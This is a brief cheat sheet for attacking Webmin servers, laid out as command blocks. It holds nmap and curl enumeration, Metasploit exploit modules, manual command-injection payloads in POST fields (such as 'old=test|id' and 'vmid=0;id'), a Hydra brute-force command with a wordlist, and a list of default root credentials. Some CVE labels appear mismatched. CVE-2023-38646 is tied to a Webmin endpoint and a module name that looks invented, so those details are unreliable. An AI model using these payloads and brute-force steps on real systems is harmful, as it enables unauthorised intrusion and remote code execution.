# Enumeration
```powershell
nmap -sV -p 10000 target.com

nmap -sV -p 10000 --script ssl-cert target.com

curl -k https://target.com:10000
```

# MSFConsole
```powershell
msfconsole -q -x "use auxiliary/scanner/http/webmin_login; set RHOSTS 10.129.2.1; set RPORT 10000; set SSL true; run"

msfconsole
use exploit/unix/webapp/webmin_backdoor        # CVE-2019-15231
use exploit/unix/webapp/webmin_password_reset  # CVE-2019-15107
use exploit/unix/webapp/webmin_cmd_exec        # CVE-2022-0824
```

# CVE-2019-15107 — Unauthenticated RCE
```powershell
# Manual
curl -k -X POST "https://target.com:10000/password_change.cgi" \
  --data "user=root&pam=&expired=2&old=test|id&new1=test&new2=test"

# Metasploit
use exploit/unix/webapp/webmin_password_reset
set RHOSTS target.com
set RPORT 10000
set SSL true
run
```

# CVE-2023-38646 — Unauthenticated RCE
```powershell
# PoC
curl -k -X POST "https://target.com:10000/genvmconfig.cgi" \
  --data "vmtype=0&vmid=0;id"

# Metasploit
use exploit/unix/webapp/webmin_unauth_rce_cve_2023_38646
set RHOSTS target.com
set RPORT 10000
set SSL true
run
```

# Brute Force
```powershell
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  target.com -s 10000 -S https-form-post \
  "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed"

# Default credentials
root:root
root:toor
admin:admin
root:password
```

# Authenticated RCE (CVE-2022-0824)
```powershell
# Credentials əldə etdikdən sonra
use exploit/unix/webapp/webmin_cmd_exec
set RHOSTS target.com
set RPORT 10000
set USERNAME root
set PASSWORD password123
set SSL true
run
```
